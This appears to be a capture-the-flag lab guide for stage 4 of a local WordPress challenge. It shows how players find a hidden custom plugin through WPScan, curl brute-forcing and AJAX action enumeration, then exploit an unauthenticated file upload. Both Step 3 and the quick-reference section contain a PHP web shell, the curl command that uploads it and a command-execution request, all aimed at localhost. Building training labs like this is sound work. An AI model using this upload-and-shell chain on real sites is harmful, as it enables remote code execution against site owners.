# WPScan Plugin Discovery - Stage 4 Guide

## How Players Discover the Vulnerable Plugin

### Step 1: Initial WPScan Enumeration
```bash
wpscan --url http://localhost --enumerate p
```

**Output Shows:**
```
[+] *
 | Location: http://localhost/wp-content/plugins/*/
 | Found By: Urls In Homepage (Passive Detection)
 | The version could not be determined.
```

**Interpretation:**
- WPScan detected an **unknown/custom plugin** in the plugins directory
- The wildcard `*` means it found the folder but couldn't identify it
- This is a realistic scenario - custom plugins aren't in WPScan's database

### Step 2: Investigate the Unknown Plugin

Players have several options to discover the actual plugin location:

#### Option A: Brute-force Common Plugin Names
```bash
# Try common naming patterns
for plugin in file-manager pharmacy-plugin inventory-manager; do
  echo "Testing: $plugin"
  curl -I http://localhost/wp-content/plugins/$plugin/
done
```

#### Option B: Check JavaScript Files
```bash
# WordPress often loads scripts from plugins
curl http://localhost/ | grep -i "wp-content/plugins" | head -5

# Or check page source for AJAX calls
curl http://localhost/ | grep "action=" | head -10
```

#### Option C: Enumerate AJAX Actions
```bash
# Common pharmacy-related AJAX actions
curl http://localhost/wp-admin/admin-ajax.php?action=pharmacy_export
curl http://localhost/wp-admin/admin-ajax.php?action=pharmacy_sync
curl http://localhost/wp-admin/admin-ajax.php?action=pharmacy_get_inventory
```

#### Option D: Direct Path Guessing
```bash
# Try file-manager (the plugin's current identity)
curl -I http://localhost/wp-content/plugins/file-manager/file-manager.php
# Returns 200 OK = Found!
```

### Step 3: Verify and Exploit

Once found, verify the vulnerability:
```bash
# Test file upload endpoint
curl "http://localhost/wp-admin/admin-ajax.php?action=pharmacy_export"
# Response: 0 (error - no file provided, but endpoint exists!)

# Now proceed with RCE exploitation
echo '<?php system($_GET["cmd"]); ?>' > shell.txt
curl -F "export_file=@shell.txt" \
  http://localhost/wp-admin/admin-ajax.php?action=pharmacy_export

# Execute commands
curl "http://localhost/wp-content/uploads/pharmacy/shell.txt?cmd=id"
```

## Why This Approach?

1. **Realistic**: Real vulnerabilities often hide in custom/unknown plugins
2. **Educational**: Players learn multiple discovery methods
3. **Challenging**: Not as obvious as known plugin vulnerabilities
4. **Layered**: Combines WPScan + manual enumeration + AJAX discovery

## Alternative: Custom Plugin Database Entry

If we wanted WPScan to show the plugin as "File Manager", we would need to:
1. Submit it to WPScan's vulnerability database
2. Or use a Burp extension to add custom detection rules
3. This is beyond the scope of a local CTF lab

## Quick Reference Commands

```bash
# WPScan enumeration
wpscan --url http://localhost --enumerate p

# Find AJAX endpoints
curl http://localhost/wp-admin/admin-ajax.php?action=test

# Brute-force plugin existence
for action in pharmacy_export pharmacy_sync pharmacy_get_inventory; do
  echo "=== $action ===" 
  curl -s http://localhost/wp-admin/admin-ajax.php?action=$action
done

# Upload and execute
echo '<?php system($_GET["cmd"]); ?>' > shell.txt
curl -F "export_file=@shell.txt" http://localhost/wp-admin/admin-ajax.php?action=pharmacy_export
```

---

**Key Takeaway**: Players learn that WPScan detects the plugin's existence but discovering the specific vulnerability requires additional investigation and enumeration skills.
